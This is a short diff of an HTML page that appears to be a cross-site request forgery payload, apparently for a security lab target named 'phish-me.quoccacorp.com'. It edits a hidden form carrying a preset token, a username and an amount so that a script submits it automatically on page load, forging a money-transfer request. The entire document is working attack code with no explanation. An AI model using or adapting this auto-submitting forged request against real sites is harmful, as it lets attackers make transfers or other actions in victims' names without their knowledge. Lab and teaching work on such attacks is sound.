@@ -1,9 +1,9 @@
-<form action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
+<form id="autoForm" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
   <input type="hidden" name="csrf_token" value="NzMwMA==" />
   <input type="hidden" name="username" value="z5476350" />
   <input type="hidden" name="amount" value="100" />
-  <input type="submit" />
 </form>
+
 <script>
-  document.forms[1].submit();
+  document.getElementById('autoForm').submit();
 </script>
